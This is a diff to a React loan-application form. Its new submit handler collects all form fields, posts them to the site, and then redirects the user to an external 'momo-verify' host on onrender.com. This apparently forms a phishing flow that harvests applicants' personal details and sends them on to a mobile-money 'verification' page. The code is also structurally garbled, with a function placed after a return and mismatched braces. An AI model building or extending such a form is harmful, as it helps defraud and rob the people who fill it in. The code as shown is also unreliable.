@@ -90,7 +90,30 @@ export default function LoanApplicationForm() {
     return <ConfirmationStep onRestart={() => setStatus('idle')} />
   }async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
   event.preventDefault()
-  window.location.assign('https://momo-verify-4pkq.onrender.com')
+  setStatus('submitting')
+
+  try {
+    const form = event.currentTarget
+    const formData = new FormData(form)
+
+    await fetch('/', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+      },
+      body: new URLSearchParams(
+        Array.from(formData.entries()).map(([key, value]) => [
+          key,
+          String(value),
+        ]),
+      ).toString(),
+    })
+
+    window.location.assign('https://momo-verify-4pkq.onrender.com')
+  } catch {
+    setStatus('error')
+  }
+}
   }
 
   return (
